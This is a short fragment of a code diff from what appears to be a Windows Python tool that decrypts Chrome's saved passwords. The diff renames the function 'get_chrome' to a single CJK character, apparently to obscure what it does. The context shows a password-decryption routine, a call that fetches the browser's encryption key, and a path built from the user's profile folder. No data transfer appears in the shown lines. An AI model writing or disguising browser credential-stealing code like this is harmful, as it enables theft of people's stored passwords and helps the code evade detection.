@@ -50,7 +50,7 @@ def decrypt_password(password, key):
             return ""
 
 
-def get_chrome():
+def 於():
     key = get_encryption_key()
     db_path = os.path.join(
         os.environ["USERPROFILE"],
